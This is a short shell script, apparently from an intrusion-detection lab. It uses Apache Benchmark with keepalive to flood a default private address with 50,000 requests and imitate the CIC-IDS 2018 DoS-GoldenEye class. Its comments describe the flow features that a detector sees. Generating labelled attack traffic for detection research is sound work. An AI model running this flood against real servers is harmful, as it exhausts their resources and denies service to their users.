#!/bin/sh
# goldeneye.sh — HTTP keepalive flood simulating DoS-GoldenEye (CIC-IDS class 4).
#
# Apache Benchmark with keepalive (-k) sends many requests over persistent
# connections, exhausting nginx's worker pool without the high per-flow rate
# of a regular HTTP flood (where each flow is a single request).
#
# OIF signature: fwd_act_data_pkts very high (many requests per TCP flow),
# flow_duration_s long (persistent connection stays open), pkt_len_mean
# moderate, bwd_pkts_per_sec sustained (server responds to every request).
# Distinct from regular HTTP flood (ab without -k): far fewer TCP flows but
# each carries hundreds of request/response cycles — same resource exhaustion,
# different per-flow feature profile.
#
# Maps to CIC-IDS 2018 class DoS-GoldenEye (class 4).
TARGET=${1:-http://172.20.0.10/}
COUNT=${2:-50000}
CONC=${3:-100}

echo "[attack] GoldenEye keepalive flood -> $TARGET  $COUNT requests  concurrency $CONC"
ab -n "$COUNT" -c "$CONC" -k "$TARGET"